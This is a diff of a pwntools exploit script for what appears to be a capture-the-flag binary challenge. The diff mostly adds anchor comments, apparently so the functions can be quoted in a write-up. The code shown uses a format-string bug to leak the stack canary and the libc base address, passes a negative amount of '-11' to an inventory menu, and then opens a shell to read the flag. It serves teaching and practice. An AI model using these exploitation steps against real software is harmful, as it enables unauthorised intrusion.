@@ -9,6 +9,7 @@ def select_menu(menu):
     conn.recvuntil('> ')
     conn.sendline(menu)
 
+# ANCHOR: format_exploit_fn
 def format_exploit(progress, index):
     progress.status("selecting menu fight")
     select_menu('1')
@@ -23,23 +24,23 @@ def format_exploit(progress, index):
     value = value[:len(value) - 8]
     value = 0 if value == b"(nil)" else int(value, 16)
     return value
+# ANCHOR_END: format_exploit_fn
 
+# ANCHOR: retrieve_canary_fn
 def retrieve_canary():
     with log.progress("retrieving canary") as progress:
         return format_exploit(progress, 11)
+# ANCHOR_END: retrieve_canary_fn
 
-def retrieve_base_address():
-    with log.progress("retrieving base address") as progress:
-        fight_return = 0xeca
-        base = format_exploit(progress, 13)
-        elf.address = base - fight_return
-
+# ANCHOR: retrieve_libc_base_address_fn
 def retrieve_libc_base_address():
     with log.progress("retrieving libc base address") as progress:
         libc_start_main_return = 0x21bf7
         base = format_exploit(progress, 21)
         libc.address = base - libc_start_main_return
+# ANCHOR_END: retrieve_libc_base_address_fn
 
+# ANCHOR: drop_pie_fn
 def drop_pie(amount):
     with log.progress("dropping pies") as progress:
         progress.status("opening inventory menu")
@@ -52,7 +53,9 @@ def drop_pie(amount):
         progress.status("drop specified amount")
         conn.recvuntil('> ')
         conn.sendline(amount)
+# ANCHOR_END: drop_pie_fn
 
+# ANCHOR: retrieve_shell_fn
 def retrieve_shell():
     with log.progress("retrieving a shell") as progress:
         progress.status("opening stare menu")
@@ -75,6 +78,7 @@ def retrieve_shell():
 
         progress.status("remove error message")
         conn.recvlines(2)
+# ANCHOR_END: retrieve_shell_fn
 
 def retrieve_flag():
     with log.progress("retrieving the flag") as progress:
@@ -83,7 +87,6 @@ def retrieve_flag():
 
 
 canary = retrieve_canary()
-retrieve_base_address()
 retrieve_libc_base_address()
 
 drop_pie('-11')
